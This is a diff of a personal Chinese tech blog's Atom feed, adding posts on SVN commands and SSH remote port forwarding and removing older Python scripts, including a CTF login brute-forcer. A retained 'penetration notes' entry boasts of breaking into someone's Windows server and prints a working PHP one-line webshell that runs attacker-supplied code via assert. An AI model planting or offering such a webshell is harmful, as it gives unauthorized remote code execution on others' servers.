@@ -4,7 +4,7 @@
   
   <link href="/atom.xml" rel="self"/>
   <link href="http://lazysheep.cc/"/>
-  <updated>2015-06-20T13:58:05.000Z</updated>
+  <updated>2015-06-29T01:58:35.000Z</updated>
   <id>http://lazysheep.cc/</id>
   
   <author>
@@ -15,11 +15,65 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title><![CDATA[SVN命令小记]]></title>
+    <link href="http://lazysheep.cc/2015/06/29/2C/"/>
+    <id>http://lazysheep.cc/2015/06/29/2C/</id>
+    <published>2015-06-29T01:52:24.000Z</published>
+    <updated>2015-06-29T01:58:35.000Z</updated>
+    <content type="html"><![CDATA[<p><img src="/img/svn.jpg" alt="svn"><br><a id="more"></a></p>
+<p>因为某些原因需要使用SVN。。</p>
+<p>而在linux上当然要使用命令行～，，所以记录些svn常用命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ svn checkout path      <span class="comment">#path为svn地址 后面可加参数 --username || --password</span></span><br><span class="line">$ svn co path <span class="comment">#上面命令的简写</span></span><br><span class="line">$ svn add file  <span class="comment">#往svn中添加文件</span></span><br><span class="line">$ svn commit -m <span class="string">"abcd"</span> <span class="comment">#增加修改信息。。。一般我都是随便填这个</span></span><br><span class="line">$ svn update <span class="comment">#更新</span></span><br></pre></td></tr></table></figure>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p><img src="/img/svn.jpg" alt="svn"><br>]]>
+    
+    </summary>
+    
+      <category term="SVN" scheme="http://lazysheep.cc/tags/SVN/"/>
+    
+      <category term="S-essay" scheme="http://lazysheep.cc/categories/S-essay/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[SSH远程端口转发小记]]></title>
+    <link href="http://lazysheep.cc/2015/06/23/2B/"/>
+    <id>http://lazysheep.cc/2015/06/23/2B/</id>
+    <published>2015-06-23T15:35:00.000Z</published>
+    <updated>2015-06-23T15:52:20.000Z</updated>
+    <content type="html"><![CDATA[<p><img src="/img/2b0.jpg" alt="SSH"><br><a id="more"></a></p>
+<p>先上代码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -CNnTf -R <span class="number">9999</span>:localhost:<span class="number">80</span> root@<span class="number">1.1</span>.<span class="number">1.1</span></span><br></pre></td></tr></table></figure>
+<p>再来解释这个语句的作用 —&gt;</p>
+<blockquote>
+<p>使用这个命令的为处于内网之内的主机A</p>
+<p>1.1.1.1为外网的服务器B</p>
+<p>把1.1.1.1的9999端口转发到主机A的80端口</p>
+</blockquote>
+<p>接下来修改 /etc/ssh/sshd_config 文件, </p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">GatewayPorts</span> <span class="built_in">yes</span>    <span class="comment">#修改成这</span></span><br><span class="line"><span class="comment">#GatewayPorts no   默认为这</span></span><br></pre></td></tr></table></figure>
+<p>之后, 另一台外网主机C, 访问1.1.1.1:9999 则会出现内网主机A——-&gt;80端口的页面~~~~</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p><img src="/img/2b0.jpg" alt="SSH"><br>]]>
+    
+    </summary>
+    
+      <category term="SSH" scheme="http://lazysheep.cc/tags/SSH/"/>
+    
+      <category term="端口转发" scheme="http://lazysheep.cc/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
+    
+      <category term="S-essay" scheme="http://lazysheep.cc/categories/S-essay/"/>
+    
+  </entry>
+  
+  <entry>
     <title><![CDATA[渗透笔记①]]></title>
     <link href="http://lazysheep.cc/2015/06/18/2A/"/>
     <id>http://lazysheep.cc/2015/06/18/2A/</id>
     <published>2015-06-18T13:29:23.000Z</published>
-    <updated>2015-06-20T13:58:05.000Z</updated>
+    <updated>2015-06-23T15:36:22.000Z</updated>
     <content type="html"><![CDATA[<p><em>一次小型渗透笔记, 嘘~</em><img src="/img/2A.gif" alt="图"><br><a id="more"></a><br>由于某些原因,又日了台某个地方的win服务器. 拿到了webshell以后,想搞到图形界面,上次搞过,不过忘了,现在又要查,因此记录下来,做备忘….</p>
 <p>找到一个较猥琐的一句话..<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line">(<span class="variable">$_</span>=@<span class="variable">$_GET</span>[<span class="string">'url'</span>]).@<span class="variable">$_</span>(<span class="variable">$_POST</span>[<span class="string">'uurrll'</span>]);</span><br><span class="line"><span class="comment">//url要为assert</span></span><br><span class="line"><span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p>其实我也很水…拿到webshell后也不知道该干嘛..只知道win可以想办法搞到图形界面…linux的就不会了..</p>
@@ -50,7 +104,7 @@
     <link href="http://lazysheep.cc/2015/06/13/0x29/"/>
     <id>http://lazysheep.cc/2015/06/13/0x29/</id>
     <published>2015-06-13T13:22:18.000Z</published>
-    <updated>2015-06-13T13:36:26.000Z</updated>
+    <updated>2015-06-23T15:36:29.000Z</updated>
     <content type="html"><![CDATA[<p><strong>最近用thinkphp写网页的时候，老是被php缓存问题搞得难受死了，今天终于解决了。</strong><br><a id="more"></a></p>
 <p>最开始以为是tp框架的缓存问题，可是tp开了调试模式后，缓存都是关的。</p>
 <p>后面又怀疑是php缓存的问题，百度之后知道，php是通过http头关闭缓存，我查看了下http头，缓存是关的。</p>
@@ -590,51 +644,6 @@
 ]]></content>
     <summary type="html">
     <![CDATA[<p>题目来源于这：<br><a href="https://github.com/Yixiaohan/show-me-the-code">https://github.com/Yixiaohan/show-me-the-code</a><br>不过我并不是按顺序做的．．．<br>]]>
-    
-    </summary>
-    
-      <category term="Python" scheme="http://lazysheep.cc/tags/Python/"/>
-    
-      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
-    
-  </entry>
-  
-  <entry>
-    <title><![CDATA[pyhon第二个脚本]]></title>
-    <link href="http://lazysheep.cc/2015/02/28/0x16/"/>
-    <id>http://lazysheep.cc/2015/02/28/0x16/</id>
-    <published>2015-02-28T07:01:25.000Z</published>
-    <updated>2015-02-28T07:16:10.000Z</updated>
-    <content type="html"><![CDATA[<p><strong>今天又折腾了一个脚本…..</strong><br><a id="more"></a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> mysql.connector</span><br><span class="line"><span class="keyword">import</span> xlwt</span><br><span class="line">con = mysql.connector.connect(user=<span class="string">'xxx'</span>,password=<span class="string">'xxx'</span>,host=<span class="string">'127.0.0.1'</span>,database=<span class="string">'xxx'</span>)</span><br><span class="line">ccc = con.cursor()</span><br><span class="line">wb = xlwt.Workbook()</span><br><span class="line">ws = wb.add_sheet(<span class="string">'123'</span>)</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'1.txt'</span>)</span><br><span class="line">hehe = f.read().split()</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">		ws.write(<span class="number">0</span>,x,hehe[x].decode(<span class="string">'utf-8'</span>))     <span class="comment">#先从1.txt中导出表头信息..然后导入表头到excel中</span></span><br><span class="line"><span class="keyword">for</span> uu <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">283</span>):               </span><br><span class="line">	que = (<span class="string">'select id,xxx,xxx,xxx,xxx,xxx,xxx,"xxx" from wp_contestant where id like "%6" group by xxx order by xxx limit '</span>) + (str(uu)) + (<span class="string">',1'</span>)</span><br><span class="line"><span class="comment">#我这里这么写是因为数据库里表中有283个数据,,,用python的connector模块跑..跑了半天都没出来...我也不清楚为什么效率这么低..所以我换了一个方法..已经知道表中有283个数据..然后就一个一个跑....这回跑了8s左右就结束了..可是感觉速度还是太慢了...</span></span><br><span class="line">	ccc.execute(que)</span><br><span class="line">	aa = ccc.fetchall()</span><br><span class="line">	<span class="comment">#print aa[0]</span></span><br><span class="line">	gg = list(aa[<span class="number">0</span>])     <span class="comment">#aa是tuple,无法更改其中的数据....所以转换为list</span></span><br><span class="line">	gg[<span class="number">5</span>] = str(gg[<span class="number">5</span>])   <span class="comment">#第六个数据是data数据...</span></span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">		ws.write(uu+<span class="number">1</span>,x,gg[x] <span class="keyword">or</span> gg[x].decode(<span class="string">'utf-8'</span>))    <span class="comment">#从数据库中读出的数据是u编码..不转换会报错</span></span><br><span class="line">wb.save(<span class="string">'123.xls'</span>)</span><br><span class="line">con.close()</span><br></pre></td></tr></table></figure></p>
-]]></content>
-    <summary type="html">
-    <![CDATA[<p><strong>今天又折腾了一个脚本…..</strong><br>]]>
-    
-    </summary>
-    
-      <category term="Python" scheme="http://lazysheep.cc/tags/Python/"/>
-    
-      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
-    
-  </entry>
-  
-  <entry>
-    <title><![CDATA[第一个py脚本]]></title>
-    <link href="http://lazysheep.cc/2015/02/26/0x15/"/>
-    <id>http://lazysheep.cc/2015/02/26/0x15/</id>
-    <published>2015-02-26T13:47:11.000Z</published>
-    <updated>2015-03-13T05:00:18.000Z</updated>
-    <content type="html"><![CDATA[<p><strong>写的第一个python脚本,,,,,</strong><br><a id="more"></a></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">url = <span class="string">'http://localhost/index.php'</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">	<span class="comment">#idd = chr(x) + 'lightless'</span></span><br><span class="line">	<span class="comment">#data = &#123;'id':idd,'ps':'abc!10O0o'&#125;</span></span><br><span class="line">	url_data = <span class="string">"ps=abc!10O0o&amp;id=lightless"</span> + chr(x)</span><br><span class="line">	f = urllib.urlopen(url,url_data)</span><br><span class="line">	html = f.read()</span><br><span class="line">	size = sys.getsizeof(html)</span><br><span class="line">	<span class="keyword">if</span> size == <span class="number">475</span> <span class="keyword">or</span> size == <span class="number">494</span> :</span><br><span class="line">		<span class="comment">#print url_data</span></span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">print</span> html</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
-<p>这个脚本是用于week4最后一题的,,不过最后结果看来,,这题的题解只能是大小写…特殊字符没用.</p>
-<p><em>后来突然想到用unicode编码看看能不能bypass，，所以更新了下脚本</em><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">url = <span class="string">'http://localhost/index.php'</span></span><br><span class="line">kkk = range(<span class="number">10</span>)</span><br><span class="line">yye = []</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">10000</span>):</span><br><span class="line">	uu = str(l).zfill(<span class="number">4</span>)</span><br><span class="line">	yye.append(uu)</span><br><span class="line">ii = <span class="string">'abcdef'</span></span><br><span class="line"><span class="keyword">for</span> aa <span class="keyword">in</span> ii:</span><br><span class="line">	<span class="keyword">for</span> bb <span class="keyword">in</span> ii:</span><br><span class="line">		<span class="keyword">for</span> cc <span class="keyword">in</span> ii:</span><br><span class="line">			<span class="keyword">for</span> dd <span class="keyword">in</span> ii:</span><br><span class="line">				tt = aa + bb + cc + dd</span><br><span class="line">				yye.append(tt)</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> yye:</span><br><span class="line">	a = <span class="string">"u'\u"</span> + l + <span class="string">"'"</span></span><br><span class="line">	ee = eval(a)			</span><br><span class="line">	url_data = <span class="string">"ps=abc!10O0o&amp;id=lightless"</span></span><br><span class="line">	f = urllib.urlopen(url,url_data)</span><br><span class="line">	html = f.read()</span><br><span class="line">	size = sys.getsizeof(html)</span><br><span class="line">	<span class="keyword">if</span> size == <span class="number">475</span> <span class="keyword">or</span> size == <span class="number">494</span> :</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">print</span> html</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
-<p>================update in 13/3 2015=============</p>
-<p>今天发现一个内置函数，<code>unichr()</code> 生成unicode字符，所以上面的代码根本不需要那么复杂。。。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1114112</span>):</span><br><span class="line">	<span class="keyword">print</span> unichr(x)</span><br></pre></td></tr></table></figure>
-<p>只要用上面这个循环就可生成所有的unicode字符。。。从0 - 1114111，总共有1114112个字符。。。。<br>最后代码成这样。。。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'utf-8'</span>)          <span class="comment">#在py2.7不设置这个会报错。。。</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://localhost/index.php'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">1114112</span>):			</span><br><span class="line">	url_data = <span class="string">"ps=abc!10O0o&amp;id=lightless"</span> + unichr(l)</span><br><span class="line">	f = urllib.urlopen(url,url_data)</span><br><span class="line">	html = f.read()</span><br><span class="line">	size = sys.getsizeof(html)</span><br><span class="line">	<span class="keyword">if</span> size == <span class="number">475</span> <span class="keyword">or</span> size == <span class="number">494</span> :</span><br><span class="line">		<span class="keyword">print</span> l</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">print</span> html</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>]]></content>
-    <summary type="html">
-    <![CDATA[<p><strong>写的第一个python脚本,,,,,</strong><br>]]>
     
     </summary>
     
